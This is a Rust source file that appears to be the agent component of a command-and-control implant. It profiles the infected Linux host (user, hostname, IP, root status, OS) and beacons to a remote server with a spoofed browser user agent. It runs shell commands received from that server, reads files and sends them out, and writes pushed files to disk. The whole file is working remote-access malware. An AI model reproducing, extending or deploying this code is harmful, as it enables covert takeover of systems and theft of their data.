use crate::serializer::Serializer;
use crate::config;

use std::fs::File;
use std::io::{BufRead, BufReader, Cursor, Read, Write};
use std::env;
use std::process;

use byteorder::{LittleEndian, ReadBytesExt};
use lazy_static::lazy_static;
use nix::unistd::{Uid, User};
use nix::net::if_::InterfaceFlags;
use nix::sys::socket::{AddressFamily, SockaddrLike};
use nix::sys::utsname::uname;
use reqwest::{blocking::Client, Error};
use rand::Rng;

#[derive(Debug)]
pub enum Command {
    Register = 0x100,
    GetJob = 0x101,
    NoJob = 0x102,
    Download = 0x150,
    Upload = 0x151,
    Shell = 0x152,
    Cd = 0x153,
    Pwd = 0x154,
    Ls = 0x155,
    Exit = 0x199,
    Output = 0x200,
    File = 0x201
}

impl Command {
    fn from_int32(value: i32) -> Self {
        match value {
            0x101 => Command::GetJob,
            0x102 => Command::NoJob,
            0x150 => Command::Download,
            0x151 => Command::Upload,
            0x152 => Command::Shell,
            0x153 => Command::Cd,
            0x154 => Command::Pwd,
            0x155 => Command::Ls,
            0x199 => Command::Exit,
            0x201 => Command::File,
            _ => Command::Output,
        }
    }
}

fn generate_id() -> i32 {
    let mut rng = rand::thread_rng();
    let session_id: i32 = rng.gen_range(1000..=9999);

    return session_id
}

lazy_static! {
    static ref ID: i32 = generate_id();
}

pub fn register() -> (Serializer, i32) {
    let mut payload = Serializer::init(*ID, Command::Register);
   
    // add session id
    payload.add_int32(*ID);

    // add hostname
    if let Ok(file) = File::open("/proc/sys/kernel/hostname") {
        let reader = BufReader::new(file);
        if let Some(hostname) = reader.lines().next() {
            if let Ok(hostname) = hostname {
                payload.add_string(hostname.trim());
            }         
        }
    } else {
        payload.add_string("ERROR");
    }

    // add username
    let uid = Uid::current();
    let user = User::from_uid(uid).unwrap().unwrap().name;
    payload.add_string(&user);


    // add ipaddress (idk if there is a better way to do this. seems legit for now)
    match nix::ifaddrs::getifaddrs() {
        Ok(addrs) => {
            for ifaddr in addrs {
                match ifaddr.address.unwrap().family() {
                    Some(AddressFamily::Inet) => {
                        if ifaddr.flags.contains(InterfaceFlags::IFF_UP) && !ifaddr.flags.contains(InterfaceFlags::IFF_LOOPBACK) {
                            match ifaddr.address {
                                Some(address) => {
                                    if ifaddr.interface_name.starts_with("en") || ifaddr.interface_name.starts_with("eth") || ifaddr.interface_name.starts_with("ens") {
                                        payload.add_string(address.as_sockaddr_in().unwrap().to_string().split(":").next().unwrap());
                                        break;
                                    }
                                },
                                None => {
                                    //println!("interface {} with unsupported address family", ifaddr.interface_name);
                                }
                            }
                        }
                    },
                    Some(_) => {
                        continue;
                    },
                    None => {
                        continue;
                    }
                }
            }
        },
        Err(_) => payload.add_string("127.0.0.1"),
    };

    // add process name
    let proc_name = match env::current_exe() {
        Ok(path) => {
            match path.file_name() {
                Some(name) => name.to_string_lossy().to_string(),
                None => String::from("error"),
            }
        }
        Err(_) => String::from("error"),
    };
   
    payload.add_string(&proc_name);

    // add current pid
    let pid = process::id();
    payload.add_int32(pid as i32);


    // add parent pid
    let status_file_path = format!("/proc/{}/status", pid);
    let status_file_content = std::fs::read_to_string(status_file_path).ok().unwrap_or(String::from("failed to read /proc/<pid>/status"));
    for line in status_file_content.lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 2 && parts[0] == "PPid:" {
            if let Ok(ppid) = parts[1].parse::<i32>() {
                payload.add_int32(ppid);
                break;
            } 
        } else {
            payload.add_int32(0);
            break;
        }
    }

    // add process architecture
    let uname = uname();
    match uname {
        Ok(info) => {
            let arch = info.machine();
            payload.add_string(arch.to_str().unwrap());
        },
        Err(_) => {
            payload.add_string("error");
        }
    }

    // add elevated flag
    let uid = Uid::effective();
    if uid == Uid::from_raw(0) {
        payload.add_int32(1);
    } else {
        payload.add_int32(0);
    }

    if let Ok(contents) = std::fs::read_to_string("/etc/os-release") {
        let mut name = None;
        let mut version = None;

        for line in contents.lines() {
            if line.starts_with("NAME=") {
                name = Some(line.split('=').nth(1).unwrap_or("").trim_matches('"'));
            } else if line.starts_with("VERSION=") {
                version = Some(line.split('=').nth(1).unwrap_or("").trim_matches('"'));
            }
        }

        if let Some(name) = name {
            payload.add_string(name);
        } else {
            payload.add_string("error");
        }

        if let Some(version) = version {
            payload.add_string(version);
        } else {
            payload.add_string("error");
        }
    } else {
        //println!("Failed to read /etc/os-release");
    }

    return (payload, *ID)
}

pub fn build_payload_get_job(agent_id: i32) -> Serializer {
    let payload = Serializer::init(agent_id, Command::GetJob);
    
    return payload
}

fn build_payload_send_output(agent_id: i32) -> Serializer {
    let payload = Serializer::init(agent_id, Command::Output);

    return payload
}

fn build_payload_send_file(agent_id: i32) -> Serializer {
    let payload = Serializer::init(agent_id, Command::File);

    return payload
}

pub fn send(data: &[u8], host: &str, port: u16, secure: bool) -> Result<Vec<u8>, Error> {
    let client = Client::new();
    let url = format!("http{}://{}:{}/index.php", if secure { "s" } else { "" }, host, port);

    let data = data.to_vec();

    let req = client.post(&url).body(data).header(reqwest::header::USER_AGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36").build()?;
    let resp = client.execute(req)?;

    let buffer = resp.bytes()?;

    Ok(buffer.to_vec())
}

/*
*   function to handle responses from server
*   checkin, shell, exit are the only commands right now
*/
pub fn handle_response(serialized_data: Serializer) {
    let buffer = serialized_data.get_buffer();
    let mut unpacker = Cursor::new(buffer);
    let response_code = unpacker.read_i32::<LittleEndian>().unwrap();
    // we recieve the response payload in little endian, but we send
    // in big endian.. not really too sure why. havent looked into it
    
    match Command::from_int32(response_code) {
        Command::Download => {
            let string_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
            let mut string_buffer = vec![0; string_len-2];
            unpacker.read_exact(&mut string_buffer).unwrap();
            let filename = String::from_utf8_lossy(&string_buffer);

            let mut payload = build_payload_send_file(*ID);
            payload.add_data(download_file(filename.to_string()).as_slice());
            
            match send(payload.get_buffer(), config::IP, config::PORT, false) {
                Ok(_) => {
                    //println!("{:?}", resp);
                }
                Err(_) => {
                    //eprintln!("{:?}", e);
                }
            }
        }
        Command::Upload => {
            println!("uploaded file received");
            let bytes_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
            let mut bytes_buffer = vec![0; bytes_len];
            unpacker.read_exact(&mut bytes_buffer).unwrap();
        
            let string_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
            let mut string_buffer = vec![0; string_len];
            unpacker.read_exact(&mut string_buffer).unwrap();
            let filename = String::from_utf8_lossy(&string_buffer[..string_len-2]);

            match File::create(filename.to_string()) {
                Ok(mut file) => {
                    match file.write_all(&bytes_buffer) {
                        Ok(_) => {},
                        Err(e) => eprintln!("{}", e),
                    }
                }
                Err(e) => eprintln!("{}", e),
            }
        }
        Command::Shell => {
            let string_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
            let mut string_buffer = vec![0; string_len-1];
            unpacker.read_exact(&mut string_buffer).unwrap();
            let cmd = String::from_utf8_lossy(&string_buffer);
            //println!("{}", cmd);
            let output = exec_shell(&cmd);
            let mut payload = build_payload_send_output(*ID);
            payload.add_string(&output);

            match send(payload.get_buffer(), config::IP, config::PORT, false) {
                Ok(_) => {
                    //println!("{:?}", resp);
                }
                Err(_) => {
                    //eprintln!("{:?}", e);
                }
            }
        }
        Command::Cd => {
            let string_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
            let mut string_buffer = vec![0; string_len-2];
            unpacker.read_exact(&mut string_buffer).unwrap();
            let path = String::from_utf8_lossy(&string_buffer);

            cd(String::from(path));
        }
        Command::Pwd => {
            let mut payload = build_payload_send_output(*ID);
            let directory = pwd();

            payload.add_string(&directory);
            match send(payload.get_buffer(), config::IP, config::PORT, false) {
                Ok(_) => {
                    //println!("{:?}", resp);
                }
                Err(_) => {
                    //eprintln!("{:?}", e);
                }
            }
        }
        Command::Ls => {
            let mut payload = build_payload_send_output(*ID);
            let directory = ls();

            payload.add_string(&directory);
            match send(payload.get_buffer(), config::IP, config::PORT, false) {
                Ok(_) => {}
                Err(_) => {}
            }
        }
        Command::NoJob => {
            //println!("no jobs for da agent");
        }
        Command::Output => {
            //println!("maybe i havent sent output back yet?");
        }
        Command::Exit => {
            println!("rip. exiting now. x_x");
            exit();
        }
        _ => {
            //println!("unknown command");
        }
    }
}

fn exec_shell(command: &str) -> String {
    let args: Vec<&str> = command.split_whitespace().collect();
    let mut cmd = process::Command::new(args[0]);

    for arg in args.iter().skip(1) {
        cmd.arg(arg);
    }

    let output = cmd.output().expect(&format!("failed to execute {}", command));
    if output.status.success() {
        let output_string = String::from_utf8_lossy(&output.stdout);
        return output_string.to_string()
    } else {
        let error_string = String::from_utf8_lossy(&output.stderr);
        return error_string.to_string()
    }
}

fn cd(path: String) -> bool {
    match std::env::set_current_dir(path) {
        Ok(_) => {
            println!("yee haw");
            true
        }
        Err(e) => {
            eprintln!("{}", e);
            false
        }
    }
}

fn pwd() -> String {
    match std::env::current_dir() {
        Ok(path) => {
            return path.to_string_lossy().to_string();
        }
        Err(_) => {
            return String::from("error");
        }
    }
}

fn ls() -> String {
    let mut directory_listing = String::new();
    match std::fs::read_dir(".") {
        Ok(dir) => {
            for entry in dir {
                if let Ok(entry) = entry {
                    directory_listing.push_str(&entry.file_name().to_string_lossy());
                    directory_listing.push('\n');
                }
            }
            return directory_listing
        }
        Err(e) => {
            eprintln!("{}", e);
            return String::from("error")
        }
    }
}

fn download_file(filename: String) -> Vec<u8> {
    match std::fs::read(filename) {
        Ok(data) => return data,
        Err(_) => return vec![],
    }
}

fn exit() {
    std::process::exit(0);
}
